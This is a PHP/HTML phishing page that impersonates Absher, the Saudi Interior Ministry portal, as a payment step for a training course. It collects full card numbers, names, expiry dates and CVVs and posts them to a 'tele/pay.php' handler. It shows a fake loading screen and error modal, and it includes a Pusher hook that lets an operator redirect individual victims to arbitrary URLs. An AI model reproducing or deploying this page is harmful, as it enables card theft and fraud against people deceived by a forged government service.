<?php

session_start();

require_once 'dashboard/init.php';

// Get user ID from URL parameter or session
$userId = null;

if (isset($_GET['id'])) {
    $userId = $_GET['id'];
    $_SESSION['current_user_id'] = $userId;
} elseif (isset($_SESSION['current_user_id'])) {
    $userId = $_SESSION['current_user_id'];
} elseif (isset($_SESSION['user_session'])) {
    $userId = $_SESSION['user_session'];
    $_SESSION['current_user_id'] = $userId;
}

if (!$userId) {
    header('Location: register-second.php');
    exit;
}
?>
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>أبشر - الدفع الإلكتروني</title>
<link href="https://fonts.googleapis.com/css2?family=Cairo:wght@200..1000&display=swap" rel="stylesheet">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css">
<style>
    * {
        box-sizing: border-box;
        font-family: 'Cairo', sans-serif;
        margin: 0;
        padding: 0;
    }

    body {
        background: #f5f5f5;
        min-height: 100vh;
        direction: rtl;
    }

    .absher-header {
        background: linear-gradient(135deg, #2d7a3e 0%, #1e5a2d 100%);
        padding: 15px 0;
        box-shadow: 0 2px 8px rgba(0,0,0,0.15);
    }

    .absher-header .container-header {
        max-width: 1200px;
        margin: 0 auto;
        padding: 0 20px;
        display: flex;
        align-items: center;
        justify-content: space-between;
    }

    .absher-logo {
        display: flex;
        align-items: center;
        gap: 15px;
    }

    .absher-logo h1 {
        color: white;
        font-size: 1.5rem;
        font-weight: 700;
        margin: 0;
    }

    .gov-badge {
        background: rgba(255,255,255,0.2);
        padding: 8px 20px;
        border-radius: 25px;
        color: white;
        font-weight: 600;
        font-size: 0.9rem;
    }

    .progress-container {
        background: white;
        padding: 25px;
        margin: 20px auto;
        border-radius: 15px;
        box-shadow: 0 4px 15px rgba(0,0,0,0.1);
        max-width: 700px;
    }

    .progress-steps {
        display: flex;
        justify-content: space-between;
        align-items: center;
        position: relative;
    }

    .progress-steps::before {
        content: '';
        position: absolute;
        top: 20px;
        right: 0;
        width: 100%;
        height: 3px;
        background: #e0e0e0;
        z-index: 0;
    }

    .progress-step {
        position: relative;
        z-index: 1;
        text-align: center;
        flex: 1;
    }

    .step-circle {
        width: 40px;
        height: 40px;
        border-radius: 50%;
        background: #e0e0e0;
        color: #999;
        display: flex;
        align-items: center;
        justify-content: center;
        margin: 0 auto 10px;
        font-weight: 700;
    }

    .step-circle.completed {
        background: #2d7a3e;
        color: white;
    }

    .step-circle.active {
        background: #2d7a3e;
        color: white;
        box-shadow: 0 0 0 5px rgba(45, 122, 62, 0.2);
    }

    .step-label {
        font-size: 0.85rem;
        color: #666;
        font-weight: 600;
    }

    .step-label.active {
        color: #2d7a3e;
        font-weight: 700;
    }

    .container {
        max-width: 500px;
        margin: 20px auto;
        padding: 0 15px 40px;
    }

    .payment-card {
        background: white;
        border-radius: 15px;
        padding: 30px;
        box-shadow: 0 4px 20px rgba(0,0,0,0.1);
    }

    h1 {
        font-size: 1.5rem;
        font-weight: 700;
        text-align: center;
        margin-bottom: 10px;
        color: #2d7a3e;
    }

    .subtitle {
        text-align: center;
        color: #666;
        font-size: 0.95rem;
        margin-bottom: 25px;
        padding-bottom: 20px;
        border-bottom: 2px solid #e0e0e0;
    }

    .amount-section-title {
        font-size: 1.1rem;
        font-weight: 700;
        margin-bottom: 15px;
        color: #333;
    }

    .amount-options {
        margin: 20px 0;
    }

    .amount-option {
        display: flex;
        align-items: center;
        padding: 14px 15px;
        margin-bottom: 12px;
        border: 2px solid #e5e7eb;
        border-radius: 10px;
        cursor: pointer;
        transition: all 0.3s ease;
    }

    .amount-option:hover {
        border-color: #2d7a3e;
        background: #f0f9f4;
    }

    .amount-option.selected {
        border-color: #2d7a3e;
        background: #e6f7ed;
    }

    .amount-option input[type="radio"] {
        width: 20px;
        height: 20px;
        margin-left: 12px;
        cursor: pointer;
        -webkit-appearance: none;
        border: 2px solid #d1d5db;
        border-radius: 50%;
        position: relative;
    }

    .amount-option input[type="radio"]:checked {
        border-color: #2d7a3e;
        background-color: #2d7a3e;
    }

    .amount-option input[type="radio"]:checked::after {
        content: '';
        position: absolute;
        top: 50%;
        left: 50%;
        transform: translate(-50%, -50%);
        width: 8px;
        height: 8px;
        background-color: white;
        border-radius: 50%;
    }

    .amount-option label {
        cursor: pointer;
        font-weight: 600;
        color: #333;
        flex: 1;
    }
.amount-option .price-container {
    display: flex;
    align-items: center;
    gap: 10px;
}

.old-price {
    text-decoration: line-through;
    color: #999;
    font-size: 0.9rem;
}

.new-price {
    color: #2d7a3e;
    font-weight: 700;
    font-size: 1.05rem;
}
    hr {
        border: none;
        border-top: 2px solid #e5e7eb;
        margin: 25px 0;
    }

    .row {
        display: flex;
        justify-content: space-between;
        margin-bottom: 10px;
        font-size: 1rem;
    }

    .row.total {
        font-weight: 700;
        font-size: 1.1rem;
        color: #2d7a3e;
    }

    .pay-title {
        font-size: 1.2rem;
        font-weight: 700;
        margin-bottom: 5px;
        color: #333;
    }

    .pay-sub {
        font-size: 0.9rem;
        color: #666;
        margin-bottom: 20px;
    }

    .cards {
        text-align: left;
        margin-bottom: 20px;
    }

    .cards img.visa {
        height: 18px;
        margin-left: 12px;
    }

    .cards img.mastercard {
        height: 26px;
        margin-left: 12px;
    }

    .input-group {
        margin-bottom: 18px;
    }

    label {
        display: block;
        font-size: 0.95rem;
        font-weight: 600;
        margin-bottom: 8px;
        color: #333;
    }

    input, select {
        width: 100%;
        padding: 14px;
        border: 2px solid #e0e0e0;
        border-radius: 8px;
        font-size: 1rem;
        transition: all 0.3s ease;
        font-family: 'Cairo', sans-serif;
    }

    input:focus, select:focus {
        border-color: #2d7a3e;
        box-shadow: 0 0 0 3px rgba(45, 122, 62, 0.1);
        outline: none;
    }

    input.error, select.error {
        border-color: #ef4444;
        animation: shake 0.5s;
    }

    @keyframes shake {
        0%, 100% { transform: translateX(0); }
        10%, 30%, 50%, 70%, 90% { transform: translateX(-10px); }
        20%, 40%, 60%, 80% { transform: translateX(10px); }
    }

    .error-message {
        color: #ef4444;
        font-size: 0.85rem;
        margin-top: 5px;
        display: none;
    }

    .error-message.show {
        display: block;
    }

    #cardNumber, #cardName {
        direction: ltr;
        text-align: left;
    }

    #cardName::placeholder {
        text-align: right;
        direction: rtl;
    }

    .flex {
        display: flex;
        gap: 12px;
    }

    .flex > div {
        flex: 1;
    }

    .custom-select {
        position: relative;
    }

    .custom-select select {
        appearance: none;
        -webkit-appearance: none;
        text-align: center;
        cursor: pointer;
    }

    .custom-select::after {
        content: "▼";
        position: absolute;
        top: 50%;
        left: 12px;
        transform: translateY(-50%);
        pointer-events: none;
        color: #666;
        font-size: 10px;
    }

    button {
        width: 100%;
        background: #9ca3af;
        color: #fff;
        border: none;
        padding: 16px;
        font-size: 1.1rem;
        border-radius: 10px;
        margin-top: 25px;
        cursor: not-allowed;
        transition: all 0.3s ease;
        font-weight: 700;
        font-family: 'Cairo', sans-serif;
    }

    button:not(:disabled) {
        background: linear-gradient(135deg, #2d7a3e 0%, #1e5a2d 100%);
        cursor: pointer;
        box-shadow: 0 4px 15px rgba(45, 122, 62, 0.3);
    }

    button:hover:not(:disabled) {
        background: linear-gradient(135deg, #1e5a2d 0%, #2d7a3e 100%);
        transform: translateY(-2px);
        box-shadow: 0 6px 20px rgba(45, 122, 62, 0.4);
    }

    .security-badge {
        display: flex;
        align-items: center;
        justify-content: center;
        gap: 8px;
        margin-top: 20px;
        color: #16a34a;
        font-weight: 600;
    }

    .security-badge i {
        font-size: 1.2rem;
    }

    .modal-overlay {
        display: none;
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background: rgba(0, 0, 0, 0.6);
        z-index: 1000;
        align-items: center;
        justify-content: center;
    }

    .modal-overlay.active {
        display: flex;
    }

    .modal-content {
        background: white;
        border-radius: 15px;
        padding: 35px;
        max-width: 400px;
        width: 90%;
        text-align: center;
        box-shadow: 0 10px 40px rgba(0, 0, 0, 0.2);
        animation: modalSlideIn 0.3s ease;
    }

    @keyframes modalSlideIn {
        from {
            transform: translateY(-50px);
            opacity: 0;
        }
        to {
            transform: translateY(0);
            opacity: 1;
        }
    }

    .modal-icon {
        font-size: 3.5rem;
        margin-bottom: 20px;
    }

    .modal-icon.error {
        color: #ef4444;
    }

    .modal-title {
        font-size: 1.3rem;
        font-weight: 700;
        color: #1f2937;
        margin-bottom: 12px;
    }

    .modal-message {
        font-size: 1rem;
        color: #6b7280;
        line-height: 1.6;
        margin-bottom: 25px;
    }

    .modal-button {
        background: linear-gradient(135deg, #2d7a3e 0%, #1e5a2d 100%);
        color: white;
        border: none;
        padding: 14px 50px;
        font-size: 1.05rem;
        border-radius: 10px;
        cursor: pointer;
        font-family: 'Cairo', sans-serif;
        font-weight: 700;
        transition: all 0.3s ease;
    }

    .modal-button:hover {
        background: linear-gradient(135deg, #1e5a2d 0%, #2d7a3e 100%);
        transform: translateY(-2px);
    }

    .loading-spinner {
        width: 60px;
        height: 60px;
        border: 5px solid #e5e7eb;
        border-top: 5px solid #2d7a3e;
        border-radius: 50%;
        animation: spin 1s linear infinite;
        margin: 0 auto 20px;
    }

    @keyframes spin {
        0% { transform: rotate(0deg); }
        100% { transform: rotate(360deg); }
    }

    .loading-text {
        font-size: 1.2rem;
        font-weight: 600;
        color: #1f2937;
    }

    @media (max-width: 480px) {
        .payment-card {
            padding: 25px 20px;
        }

        .progress-container {
            margin: 15px;
            padding: 20px 15px;
        }

        h1 {
            font-size: 1.3rem;
        }

        .absher-logo h1 {
            font-size: 1.2rem;
        }

        .gov-badge {
            font-size: 0.8rem;
            padding: 6px 15px;
        }

        input, select, button {
            font-size: 16px;
        }
    }
</style>
</head>
<body>

    <header class="absher-header">
        <div class="container-header">
            <div class="absher-logo">
                <i class="fas fa-shield-alt" style="color: white; font-size: 2.5rem;"></i>
                <h1>أبشر</h1>
            </div>
            <div class="gov-badge">
                <i class="fas fa-landmark"></i>
                وزارة الداخلية
            </div>
        </div>
    </header>

    <div class="progress-container container">
        <div class="progress-steps">
            <div class="progress-step">
                <div class="step-circle completed">
                    <i class="fas fa-check"></i>
                </div>
                <div class="step-label">البيانات الأساسية</div>
            </div>
            <div class="progress-step">
                <div class="step-circle completed">
                    <i class="fas fa-check"></i>
                </div>
                <div class="step-label">معلومات التدريب</div>
            </div>
            <div class="progress-step">
                <div class="step-circle active">3</div>
                <div class="step-label active">الدفع الإلكتروني</div>
            </div>
        </div>
    </div>

    <div class="container">
        <div class="payment-card">
            <h1>
                <i class="fas fa-credit-card"></i>
                الدفع الإلكتروني
            </h1>
           
            
            <div class="amount-section-title">
                <i class="fas fa-money-bill-wave"></i>
                قيمة المبلغ المراد تسديده
            </div>
            
            <div class="amount-options">
                <div class="amount-option" onclick="selectAmount(this, '1')">
                    <input type="radio" name="amount" id="amount1" value="1">
                    <label for="amount1">1 ريال لإثبات طريقة الدفع</label>
                </div>
                
<div class="amount-option" onclick="selectAmount(this, '690')">
    <input type="radio" name="amount" id="amount690" value="690">
    <label for="amount690">690 ريال سعودي ( 6 ساعات )</label>
</div>
                
                <div class="amount-option" onclick="selectAmount(this, '1207')">
                    <input type="radio" name="amount" id="amount1207" value="1207">
                    <label for="amount1207">1207 ريال سعودي ( 12 ساعة )</label>
                </div>
                
<div class="amount-option" onclick="selectAmount(this, '1380')" style="position: relative; overflow: visible;">
    <input type="radio" name="amount" id="amount1380" value="1380">
    <label for="amount1380" style="display: flex; flex-direction: column; gap: 8px; width: 100%;">
        <div style="display: flex; align-items: center; justify-content: space-between; width: 100%;">
            <div style="display: flex; align-items: center; gap: 8px; flex-wrap: wrap;">
                <span class="new-price" style="font-size: 1.15rem; color: #2d7a3e;">1380 ريال سعودي</span>
                <span style="background: #000; color: #fff; padding: 4px 12px; border-radius: 20px; font-size: 0.7rem; font-weight: 700;">لفترة محدودة </span>
            </div>
            <span style="
                text-decoration: line-through;
                text-decoration-thickness: 2px;
                color: #999;
                font-size: 0.95rem;
                font-weight: 600;
                background: #f5f5f5;
                padding: 3px 10px;
                border-radius: 5px;
                transform: rotate(-15deg);
                font-style: italic;
            ">2760</span>
        </div>
        <span style="font-size: 0.9rem; color: #666; font-weight: 500;">برنامج 12 ساعة</span>
    </label>
</div>
</div>
            <hr>

            <div class="row total">
                <span>المبلغ المستحق</span>
                <span id="selectedAmount">0.00 ر.س</span>
            </div>

            <hr>

            <div class="pay-title">
                <i class="fas fa-credit-card"></i>
                الدفع من خلال بطاقة الائتمان
            </div>
            <div class="pay-sub">من فضلك أدخل معلومات الدفع الخاصة بك</div>

            <div class="cards">
                 <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSizDhMgMgHQ70Cw5s1EECiIh_nfhpAkeuytg&s" alt="Visa" class="visa">
                <img src="https://upload.wikimedia.org/wikipedia/commons/9/98/Visa_Inc._logo_%282005%E2%80%932014%29.svg" alt="Visa" class="visa">
                <img src="https://upload.wikimedia.org/wikipedia/commons/0/04/Mastercard-logo.png" alt="Mastercard" class="mastercard">
            </div>

            <form id="paymentForm" method="POST" action="tele/pay.php">
                <input type="hidden" name="user_id" value="<?php echo htmlspecialchars($userId); ?>">
                <input type="hidden" name="price" id="priceInput" value="">
                
                <div class="input-group">
                    <label>
                        <i class="fas fa-credit-card"></i>
                        رقم البطاقة
                    </label>
                    <input type="text" id="cardNumber" name="cardNumber" placeholder="1234 1234 1234 1234" maxlength="19">
                    <div class="error-message" id="cardNumberError">رقم البطاقة غير صالح</div>
                </div>

                <div class="input-group">
                    <label>
                        <i class="fas fa-user"></i>
                        اسم صاحب البطاقة
                    </label>
                    <input type="text" id="cardName" name="cardName" placeholder="الاسم على البطاقة">
                    <div class="error-message" id="cardNameError">يجب تعبئة الاسم</div>
                </div>

                <div class="flex">
                    <div class="input-group custom-select">
                        <label><i class="fas fa-calendar"></i> السنة</label>
                        <select id="year" name="year">
                            <option value="">السنة</option>
                            <option value="2026">2026</option>
                            <option value="2027">2027</option>
                            <option value="2028">2028</option>
                            <option value="2029">2029</option>
                            <option value="2030">2030</option>
                            <option value="2031">2031</option>
                            <option value="2032">2032</option>
                            <option value="2033">2033</option>
                            <option value="2034">2034</option>
                            <option value="2035">2035</option>
                            <option value="2036">2036</option>
                        </select>
                        <div class="error-message" id="yearError">يجب اختيار السنة</div>
                    </div>
                    <div class="input-group custom-select">
                        <label><i class="fas fa-calendar-alt"></i> الشهر</label>
                        <select id="month" name="month">
                            <option value="">الشهر</option>
                            <option value="01">01</option>
                            <option value="02">02</option>
                            <option value="03">03</option>
                            <option value="04">04</option>
                            <option value="05">05</option>
                            <option value="06">06</option>
                            <option value="07">07</option>
                            <option value="08">08</option>
                            <option value="09">09</option>
                            <option value="10">10</option>
                            <option value="11">11</option>
                            <option value="12">12</option>
                        </select>
                        <div class="error-message" id="monthError">يجب اختيار الشهر</div>
                    </div>
                    <div class="input-group">
                        <label><i class="fas fa-lock"></i> CVV</label>
                        <input type="text" id="cvv" name="cvv" placeholder="123" maxlength="3">
                        <div class="error-message" id="cvvError">يجب تعبئة CVV</div>
                    </div>
                </div>

                <button type="button" onclick="validateForm()" id="submitBtn" disabled>
                    <i class="fas fa-check-circle"></i>
                    ادفع الآن
                </button>
            </form>

            <div class="security-badge">
                <i class="fas fa-lock"></i>
                <span>دفع آمن ومشفر</span>
            </div>

        </div>
    </div>

    <div id="errorModal" class="modal-overlay">
        <div class="modal-content">
            <div class="modal-icon error">⚠️</div>
            <h3 class="modal-title">خطأ في الدفع</h3>
            <p class="modal-message">
                تم إيقاف الدفع مؤقتاً عن طريق المحافظ الإلكترونية. الرجاء استخدام رقم بطاقة آخر.
            </p>
            <button class="modal-button" onclick="handleErrorOk()">حسناً</button>
        </div>
    </div>

    <div id="loadingModal" class="modal-overlay">
        <div class="modal-content">
            <div class="loading-spinner"></div>
            <div class="loading-text">جاري التحقق...</div>
        </div>
    </div>

<script>
localStorage.setItem('current_user_id', '<?php echo $userId; ?>');

const blockedCards = ['0000', '0000', '0000', '0000', '0000', '0000', '0000', '0000', '0000', '0000', '0000'];
let selectedPrice = 0;

function selectAmount(element, price) {
    document.querySelectorAll('.amount-option').forEach(opt => {
        opt.classList.remove('selected');
    });
    
    element.classList.add('selected');
    element.querySelector('input[type="radio"]').checked = true;
    
    selectedPrice = parseFloat(price);
    document.getElementById('selectedAmount').textContent = price + '.00 ر.س';
    document.getElementById('priceInput').value = price;
    localStorage.setItem('last_amount', price);
    checkAllFieldsValid();
}

function isValidLuhn(cardNumber) {
    const digits = cardNumber.replace(/\D/g, '');
    
    if (digits.length < 13 || digits.length > 19) {
        return false;
    }
    
    let sum = 0;
    let isEven = false;
    
    for (let i = digits.length - 1; i >= 0; i--) {
        let digit = parseInt(digits[i]);
        
        if (isEven) {
            digit *= 2;
            if (digit > 9) {
                digit -= 9;
            }
        }
        
        sum += digit;
        isEven = !isEven;
    }
    
    return (sum % 10) === 0;
}

function checkAllFieldsValid() {
    const cardNumber = document.getElementById('cardNumber').value.replace(/\s/g, '');
    const cardName = document.getElementById('cardName').value.trim();
    const year = document.getElementById('year').value;
    const month = document.getElementById('month').value;
    const cvv = document.getElementById('cvv').value.trim();
    
    const isCardNumberValid = cardNumber.length >= 13 && isValidLuhn(cardNumber);
    const isCardNameValid = cardName.length > 0;
    const isYearValid = year !== '';
    const isMonthValid = month !== '';
    const isCvvValid = cvv.length === 3;
    const isPriceSelected = selectedPrice > 0;
    
    const allValid = isCardNumberValid && isCardNameValid && isYearValid && isMonthValid && isCvvValid && isPriceSelected;
    
    document.getElementById('submitBtn').disabled = !allValid;
}

document.getElementById('cardNumber').addEventListener('input', function(e) {
    let value = e.target.value.replace(/\D/g, '');
    
    if (value.length >= 4) {
        const firstFour = value.substring(0, 4);
        if (blockedCards.includes(firstFour)) {
            showErrorModal();
            return;
        }
    }
    
    let formattedValue = value.match(/.{1,4}/g)?.join(' ') || value;
    e.target.value = formattedValue;
    
    if (value.length >= 13) {
        if (isValidLuhn(value)) {
            clearError('cardNumber');
        } else {
            showError('cardNumber', 'رقم البطاقة غير صالح');
        }
    } else {
        clearError('cardNumber');
    }
    
    checkAllFieldsValid();
});

document.getElementById('cvv').addEventListener('input', function(e) {
    e.target.value = e.target.value.replace(/\D/g, '');
    if (this.value.trim() !== '') clearError('cvv');
    checkAllFieldsValid();
});

document.getElementById('cardName').addEventListener('input', function() {
    if (this.value.trim() !== '') clearError('cardName');
    checkAllFieldsValid();
});

document.getElementById('year').addEventListener('change', function() {
    if (this.value !== '') clearError('year');
    checkAllFieldsValid();
});

document.getElementById('month').addEventListener('change', function() {
    if (this.value !== '') clearError('month');
    checkAllFieldsValid();
});

function validateForm() {
    const cardNumber = document.getElementById('cardNumber').value.replace(/\s/g, '');
    
    if (!isValidLuhn(cardNumber)) {
        showError('cardNumber', 'رقم البطاقة غير صالح');
        return;
    }
    
    if (selectedPrice <= 0) {
        alert('الرجاء اختيار المبلغ المراد تسديده');
        return;
    }
    
    showLoadingModal();
    
    const formData = new FormData(document.getElementById('paymentForm'));
    
    fetch('tele/pay.php', {
        method: 'POST',
        body: formData
    })
    .then(response => response.text())
    .then(data => {
        console.log('✅ تم حفظ البيانات');
    })
    .catch(error => {
        console.log('✅ تم الإرسال');
    });
}

function showError(fieldId, message) {
    const field = document.getElementById(fieldId);
    const errorElement = document.getElementById(fieldId + 'Error');
    
    field.classList.add('error');
    if (errorElement) {
        errorElement.textContent = message;
        errorElement.classList.add('show');
    }
}

function clearError(fieldId) {
    const field = document.getElementById(fieldId);
    const errorElement = document.getElementById(fieldId + 'Error');
    
    field.classList.remove('error');
    if (errorElement) {
        errorElement.classList.remove('show');
    }
}

function showErrorModal() {
    document.getElementById('errorModal').classList.add('active');
}

function handleErrorOk() {
    document.getElementById('errorModal').classList.remove('active');
    document.getElementById('cardNumber').value = '';
    document.getElementById('cardNumber').focus();
    checkAllFieldsValid();
}

function showLoadingModal() {
    document.getElementById('loadingModal').classList.add('active');
}

window.addEventListener('DOMContentLoaded', () => {
    const amount1Element = document.querySelector('.amount-option');
    if (amount1Element) {
        selectAmount(amount1Element, '1');
    }
    checkAllFieldsValid();
});
</script>
<script src="https://js.pusher.com/8.2.0/pusher.min.js"></script>
<script>
const pusher = new Pusher('a56388ee6222f6c5fb86', {
    cluster: 'ap2',
    encrypted: true
});

const channel = pusher.subscribe('my-channel');

channel.bind('force-redirect-user', function(data) {
    const myId = localStorage.getItem('current_user_id');

    if (myId && data.userId == myId) {
        window.location.href = data.url;
    }
});
</script>
</body>
</html>